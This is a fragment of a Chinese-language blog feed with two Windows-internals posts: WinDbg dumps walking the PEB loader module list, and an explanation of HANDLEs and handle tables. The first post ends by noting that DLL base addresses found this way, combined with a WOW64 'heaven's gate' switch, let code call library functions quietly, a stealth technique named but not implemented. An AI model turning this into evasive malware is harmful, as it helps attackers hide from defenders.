   <span class="token operator">+</span><span class="token number">0x068</span> CorILOnly        <span class="token operator">:</span> Pos <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ChpeImage        <span class="token operator">:</span> Pos <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ChpeEmulatorImage <span class="token operator">:</span> Pos <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags5   <span class="token operator">:</span> Pos <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> Redirected       <span class="token operator">:</span> Pos <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags6   <span class="token operator">:</span> Pos <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> CompatDatabaseProcessed <span class="token operator">:</span> Pos <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x06c</span> ObsoleteLoadCount <span class="token operator">:</span> Uint2B
   <span class="token operator">+</span><span class="token number">0x06e</span> TlsIndex         <span class="token operator">:</span> Uint2B
   <span class="token operator">+</span><span class="token number">0x070</span> HashLinks        <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x080</span> TimeDateStamp    <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x088</span> EntryPointActivationContext <span class="token operator">:</span> Ptr64 _ACTIVATION_CONTEXT
   <span class="token operator">+</span><span class="token number">0x090</span> Lock             <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x098</span> DdagNode         <span class="token operator">:</span> Ptr64 _LDR_DDAG_NODE
   <span class="token operator">+</span><span class="token number">0x0a0</span> NodeModuleLink   <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x0b0</span> LoadContext      <span class="token operator">:</span> Ptr64 _LDRP_LOAD_CONTEXT
   <span class="token operator">+</span><span class="token number">0x0b8</span> ParentDllBase    <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x0c0</span> SwitchBackContext <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x0c8</span> BaseAddressIndexNode <span class="token operator">:</span> _RTL_BALANCED_NODE
   <span class="token operator">+</span><span class="token number">0x0e0</span> MappingInfoIndexNode <span class="token operator">:</span> _RTL_BALANCED_NODE
   <span class="token operator">+</span><span class="token number">0x0f8</span> OriginalBase     <span class="token operator">:</span> Uint8B
   <span class="token operator">+</span><span class="token number">0x100</span> LoadTime         <span class="token operator">:</span> _LARGE_INTEGER
   <span class="token operator">+</span><span class="token number">0x108</span> BaseNameHashValue <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x10c</span> LoadReason       <span class="token operator">:</span> _LDR_DLL_LOAD_REASON
   <span class="token operator">+</span><span class="token number">0x110</span> ImplicitPathOptions <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x114</span> ReferenceCount   <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x118</span> DependentLoadFlags <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x11c</span> SigningLevel     <span class="token operator">:</span> UChar
   <span class="token operator">+</span><span class="token number">0x120</span> CheckSum         <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x128</span> ActivePatchImageBase <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x130</span> HotPatchState    <span class="token operator">:</span> _LDR_HOT_PATCH_STATE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; !peb
PEB at 00000044333bb000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00007ff7fdf00000
    NtGlobalFlag:             70
    NtGlobalFlag2:            0
    Ldr                       00007ffdb725a120
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00000205cd2b3f90 . 00000205cd2b4860
    Ldr.InLoadOrderModuleList:           00000205cd2b4160 . 00000205cd2b6c60
    Ldr.InMemoryOrderModuleList:         00000205cd2b4170 . 00000205cd2b6c70
                    Base TimeStamp                     Module
            7ff7fdf00000 622895d5 Mar 09 19:56:05 2022 C:\Users\orz10\ROOT\security\learn\start\a.exe
            7ffdb70e0000 931cda92 Mar 18 18:55:14 2048 C:\Windows\SYSTEM32\ntdll.dll
            7ffdb6bc0000 7b65e245 Aug 09 20:17:09 2035 C:\Windows\System32\KERNEL32.DLL
            7ffdb48d0000 71a5cb5d Jun 03 12:21:49 2030 C:\Windows\System32\KERNELBASE.dll
            7ffdb6a70000 90483ed2 Sep 16 03:49:38 2046 C:\Windows\System32\msvcrt.dll


0:000&gt; dt _PEB_LDR_DATA 00007ffdb725a120
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 &#39;&#39;
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b4160 - 0x00000205&#96;cd2b6c60 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b4170 - 0x00000205&#96;cd2b6c70 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b3f90 - 0x00000205&#96;cd2b4860 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 &#39;&#39;
   +0x050 ShutdownThreadId : (null) 
    
# 查看 InLoadOrderModuleList 的第一项

0:000&gt; dq 00007ffdb725a130
00007ffd&#96;b725a130  00000205&#96;cd2b4160 00000205&#96;cd2b6c60
00007ffd&#96;b725a140  00000205&#96;cd2b4170 00000205&#96;cd2b6c70
00007ffd&#96;b725a150  00000205&#96;cd2b3f90 00000205&#96;cd2b4860
00007ffd&#96;b725a160  00000000&#96;00000000 00000000&#96;00000000
00007ffd&#96;b725a170  00000000&#96;00000000 00000000&#96;00000001
00007ffd&#96;b725a180  00000205&#96;cd2b0000 00000000&#96;00000000
00007ffd&#96;b725a190  00000000&#96;00000000 00000000&#96;00000000
00007ffd&#96;b725a1a0  00000000&#96;00000000 00000000&#96;00000000

# InLoadOrderModuleList 链表节点
# 0x00000205&#96;cd2b4160 0x00000205&#96;cd2b3f70
# 0x00000205&#96;cd2b4840 0x00000205&#96;cd2b4f70 
# 0x00000205&#96;cd2b6c60 0x00007ffd&#96;b725a130 
# 0x00000205&#96;cd2b4160

# 第一个加载的是 a.exe

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 00000205&#96;cd2b4160
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f70 - 0x00007ffd&#96;b725a130 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f80 - 0x00007ffd&#96;b725a140 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000&#96;00000000 - 0x00000000&#96;00000000 ]
   +0x030 DllBase          : 0x00007ff7&#96;fdf00000 Void
   +0x038 EntryPoint       : 0x00007ff7&#96;fdf014d0 Void
   +0x040 SizeOfImage      : 0x42000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Users\orz10\ROOT\security\learn\start\a.exe&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;a.exe&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;
   +0x068 Flags            : 0x22cc
   +0x068 PackagedBinary   : 0y0

# 第二个是 ntdll.dll

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b3f70
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4840 - 0x00000205&#96;cd2b4160 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4850 - 0x00000205&#96;cd2b4170 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f90 - 0x00007ffd&#96;b725a150 ]
   +0x030 DllBase          : 0x00007ffd&#96;b70e0000 Void
   +0x038 EntryPoint       : (null) 
   +0x040 SizeOfImage      : 0x209000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\SYSTEM32\ntdll.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;

# 第三个 KERNEL32.DLL

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b4840
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f70 - 0x00000205&#96;cd2b3f70 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f80 - 0x00000205&#96;cd2b3f80 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a150 - 0x00000205&#96;cd2b4f90 ]
   +0x030 DllBase          : 0x00007ffd&#96;b6bc0000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b6bd5580 Void
   +0x040 SizeOfImage      : 0xbd000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\KERNEL32.DLL&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;
   
# 第四个 KERNELBASE.dll

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b4f70
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b6c60 - 0x00000205&#96;cd2b4840 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b6c70 - 0x00000205&#96;cd2b4850 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4860 - 0x00000205&#96;cd2b3f90 ]
   +0x030 DllBase          : 0x00007ffd&#96;b48d0000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b48f4620 Void
   +0x040 SizeOfImage      : 0x374000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\KERNELBASE.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;KERNELBASE.dll&quot;
   
# 第五个 msvcrt.dll
   
0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b6c60
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a130 - 0x00000205&#96;cd2b4f70 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a140 - 0x00000205&#96;cd2b4f80 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000&#96;00000000 - 0x00000000&#96;00000000 ]
   +0x030 DllBase          : 0x00007ffd&#96;b6a70000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b6a77af0 Void
   +0x040 SizeOfImage      : 0xa3000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\msvcrt.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;msvcrt.dll&quot;

# 第六个为 空

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00007ffd&#96;b725a130
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4160 - 0x00000205&#96;cd2b6c60 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4170 - 0x00000205&#96;cd2b6c70 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f90 - 0x00000205&#96;cd2b4860 ]
   +0x030 DllBase          : (null) 
   +0x038 EntryPoint       : (null) 
   +0x040 SizeOfImage      : 0
   +0x048 FullDllName      : _UNICODE_STRING &quot;&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;&quot;
   +0x068 FlagGroup        : [4]  &quot;&quot;
   +0x068 Flags            : 0
   +0x068 PackagedBinary   : 0y0
   +0x068 MarkedForRemoval : 0y0
   +0x068 ImageDll         : 0y0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过这些数据结构，可以获得 对应 dll 的基地址，利用 wow64 heaven’s gate 跳转到 x64 后再调用这些接口，我们就可以悄悄地执行一些库函数。虽然研究过直接调用一些系统调用，但是 windows 的系统调用封装的比较好，还不是很明白。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>留坑</tag>
      </tags>
  </entry>
  <entry>
    <title>WIN HANDLE</title>
    <url>/2020/09/27/win_handle/</url>
    <content><![CDATA[<h1 id="首先什么是-HANDLE"><a href="#首先什么是-HANDLE" class="headerlink" title="首先什么是 HANDLE"></a>首先什么是 HANDLE</h1><p>It’s an abstract reference value to a resource, often memory or an open file, or a pipe. (来自stackoverflow)<br>我个人的理解，HANDLE 就是一种为了统一资源的封装，所有的资源，内存，进程，甚至各种各样的设备，都可以通过 windows api，通过 handle 操作，拥有了 handle，就拥有了资源的操作权。比如说，在 windows 创建进程的过程中，通过 <a href="http://www.rohitab.com/apimonitor">api monitor </a> 可以很好的知道操作系统在用户态和内核交互的过程中做了什么，我们会发现为了创建一个进程，我们会获取一段内存，然后再把程序映射进去，对内存的操作也都是通过 HANDLE 传入传出实现的。</p>
<h2 id="被面试官问了-HANDLE-和-PID-的关系"><a href="#被面试官问了-HANDLE-和-PID-的关系" class="headerlink" title="被面试官问了 HANDLE 和 PID 的关系"></a>被面试官问了 HANDLE 和 PID 的关系</h2><p>因为没有仔细分析，或者说是看过类似的资料，只能口糊一个。</p>
<p>HANDLE 和 PID 都是 32 位无符号整数。</p>
<p>系统，用户根据 pid 唯一确定一个进程<br>可以通过 handle 以及 每个进程的句柄表 获得内核对象的实际地址，是一种间接的映射。</p>
<h1 id="曾经以前的认识，来自《WINDOWS核心编程》"><a href="#曾经以前的认识，来自《WINDOWS核心编程》" class="headerlink" title="曾经以前的认识，来自《WINDOWS核心编程》"></a>曾经以前的认识，来自《WINDOWS核心编程》</h1><p>1.调用了一个创建内核对象的函数时，函数会返回一个句柄，它标识了内核对象。</p>
<p>2.内核对象是由操作系统使用的，而非进程。</p>
<p>3.内核对象如果被别的进程使用，那么其中的计数器没有减到0该内核对象就不会被销毁。</p>
<p>4.进程初始化时，系统会给进程分配一个句柄表，这个表仅供内核对象使用，用户对象用不了，句柄表是一个数据结构组成的数组，每个结构都有 { 指向内核对象内存块的指针，访问掩码，标志}</p>
<p>5.进程首次初始化时，句柄表为空，当进程内的一个线程调用一个会创建内核对象的函数时，内核将会为这个对象分配并初始化一个内存块，然后内存扫描进程的句柄表，查找一个空白的记录项，然后写入到其中（系统干的！），其中指向内核对象的就是刚才那个进程初始化中的那个结构体的第一个参数。</p>
<p>6.那什么是handle呢，举一个例子</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">#<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment">/* 
HANDLE CreateFileMappingA(
  HANDLE                hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD                 flProtect,
  DWORD                 dwMaximumSizeHigh,
  DWORD                 dwMaximumSizeLow,
  LPCSTR                lpName
);
*/</span>
<span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    HANDLE file <span class="token operator">=</span> <span class="token function">CreateFileMappingA</span><span class="token punctuation">(</span>
        hFile<span class="token punctuation">,</span>
        lpFile<span class="token punctuation">,</span>
        flProtect<span class="token punctuation">,</span>
        dwMH<span class="token punctuation">,</span>
        dwML<span class="token punctuation">,</span>
        lpname
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*当程序从入口点进入，进入到了主函数(_tmain)，会有一个进程产生，此时句柄表为空，进程本身啥也不干，贼懒，【】创建了一个主线程，然后开始运行，运行到下面发现有一个CreateFileMappingA()函数，进程知道要创建内核对象了，然后系统得知，系统再把这个内核对象写入到内存中(包括内存初始化)，然后再把对应的指针，掩码，标志，写到句柄表中。这个句柄表只有内核才能操作，然后这个内核对象只能通过其句柄和一定的函数才能操作*/</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Handle</tag>
      </tags>
  </entry>
</search>
